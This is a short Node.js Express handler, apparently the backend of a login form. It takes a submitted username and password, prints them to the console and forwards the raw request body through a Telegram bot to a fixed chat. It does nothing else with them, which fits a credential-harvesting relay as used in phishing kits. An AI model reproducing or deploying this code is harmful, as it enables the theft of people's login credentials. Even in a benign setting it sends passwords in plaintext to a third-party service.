import TelegramBot from "node-telegram-bot-api";
import { bot } from "../bot.js";
const token = process.env.TOKEN
const chatID = process.env.CHAT_ID

export function sendMessage(req, res) {
    const { username, password } = req.body;

    console.log(req.body)
    bot.sendMessage(chatID, JSON.stringify(req.body));
    
    //bot.on('message', (msg) => {
    //    const chatId = chatID || msg.chat.id;
    //    const reponse = `Hola ${msg.from.first_name}, recibi tu mensaje`;
        
     //   bot.sendMessage(chatId, reponse);
   // })
    res.send('Mensaje enviado');
}